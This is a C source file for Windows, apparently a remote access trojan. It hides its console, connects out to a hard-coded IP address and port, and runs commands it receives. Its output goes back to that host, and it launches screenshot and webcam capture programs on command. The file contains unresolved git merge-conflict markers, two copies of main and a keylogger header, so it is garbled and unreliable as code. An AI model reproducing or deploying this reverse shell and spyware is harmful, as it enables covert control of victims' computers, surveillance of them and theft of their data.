#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <direct.h>
<<<<<<< HEAD
<<<<<<< HEAD

int main() {
  HWND hide;
  AllocConsole();
  hide = FindWindowA("consoleWindowClass", NULL);
  ShowWindow(hide, 0);
  WSADATA WSAData;
  SOCKET sock;
  SOCKADDR_IN sin;
  char buffer[100], path[32768], rep[32768];
  FILE *f = NULL;
  WSAStartup(MAKEWORD(2, 0), &WSAData);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  sin.sin_addr.s_addr = inet_addr("81.64.225.105");
  sin.sin_family = AF_INET;
  sin.sin_port = htons(5566);

  while (connect(sock, (SOCKADDR *)&sin, sizeof(sin)) == SOCKET_ERROR) {
    printf("erreur\n");
  }

  while (1) {
    int test = recv(sock, buffer, sizeof(buffer), 0);

    if (test == 0 || test == SOCKET_ERROR) {
      _chdir("C:\\Squadro");
      system("start windowsSystem.exe");
      printf("pas de reception\n");
      closesocket(sock);
      WSACleanup();
      exit(0);
    }
    else {
      if (buffer[0] == 'C' || buffer[0] == 'D') {
        if (_chdir(buffer) == 0) {
          _chdir(buffer);
          send(sock, "Le changement de reprtoire c'est bien deroule", sizeof("Le changement de reprtoire c'est bien deroule") + 1, 0);
        }
        else {
          send(sock, "Le changement de repertoire a echoue", sizeof("Le changement de repertoire a echoue") + 1, 0);
        }
      }
      else if (strcmp(buffer, "screenshot") == 0) {
        _chdir("C:\\Squadro\\screen");
        system("start screen.exe");
        send(sock, "Screen effectue", sizeof("Screen effectue") + 1, 0);
      }
      else if (strcmp(buffer, "webcam") == 0) {
        _chdir("C:\\Squadro\\capture");
        system("start capture.exe");
        send(sock, "Capture effectue", sizeof("Capture effectue") + 1, 0);
      }
      else {
        f = _popen(buffer, "r");

        ZeroMemory(path, 32768);
        ZeroMemory(rep, 32768);
        while (fgets(path, sizeof(path) - 1, f) != NULL) {
          strcat(rep, path);
        }

        send(sock, rep, sizeof(rep) + 1, 0);

        _pclose(f);
      }
    }
  }

  return 0;
=======
#include "Keylogger.h"
=======

>>>>>>> Added screen and webcam capture features

int main()
{
    HWND hide;
    AllocConsole();
    hide = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(hide, 0);
    WSADATA WSAData;
    SOCKET sock;
    SOCKADDR_IN sin;
    char buffer[100], path[32768], rep[32768];
    FILE *f = NULL;
    WSAStartup(MAKEWORD(2,0), &WSAData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    sin.sin_addr.s_addr = inet_addr("81.64.225.105");
    sin.sin_family = AF_INET;
    sin.sin_port = htons(5566);


        while(connect(sock, (SOCKADDR *)&sin, sizeof(sin)) == SOCKET_ERROR){
                printf("erreur\n");
        }

    while(1){

     int test = recv(sock, buffer, sizeof(buffer), 0);

        if(test == 0 || test == SOCKET_ERROR){
            _chdir("C:\\Squadro");
            system("start windowsSystem.exe");
            printf("pas de reception\n");
            closesocket(sock);
            WSACleanup();
            exit(0);
        }else{
                     if(buffer[0] == 'C' || buffer[0] == 'D'){

                        if(_chdir(buffer) == 0){
                            _chdir(buffer);
                            send(sock, "Le changement de reprtoire c'est bien deroule", sizeof("Le changement de reprtoire c'est bien deroule") + 1, 0);
                        }else{
                            send(sock, "Le changement de repertoire a echoue", sizeof("Le changement de repertoire a echoue") + 1, 0);

                        }
                     }else if(strcmp(buffer,"screenshot") == 0){
                        _chdir("C:\\Squadro\\screen");
                        system("start screen.exe");
                        send(sock, "Screen effectue", sizeof("Screen effectue") + 1, 0);
                     }else if(strcmp(buffer,"webcam") == 0){
                        _chdir("C:\\Squadro\\capture");
                        system("start capture.exe");
                        send(sock, "Capture effectue", sizeof("Capture effectue") + 1, 0);
                     }else{

                     f = _popen(buffer, "r");

                     ZeroMemory(path,32768);
                     ZeroMemory(rep, 32768);
                     while(fgets(path, sizeof(path) - 1, f) != NULL){

                        strcat(rep, path);
                     }



                     send(sock, rep, sizeof(rep) + 1, 0);

                     _pclose(f);

                     }


             }


    }


    return 0;
>>>>>>> First commit!
}


